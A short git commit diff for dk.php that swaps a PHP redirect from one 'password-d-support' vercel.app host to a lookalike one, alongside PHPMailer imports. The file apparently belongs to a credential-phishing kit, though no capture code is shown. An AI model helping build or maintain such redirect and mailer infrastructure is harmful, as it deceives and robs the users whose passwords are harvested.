5894cf46470421ea044f97b18fe93e63a0b818de
dkk6147 <dkk6147@gmail.com>
2025-08-31 09:14:28 -0700

    Update dk.php

--- dk.php
+++ dk.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://password-d-support.vercel.app/");
+header("Location: https://password-d-support-fawn.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
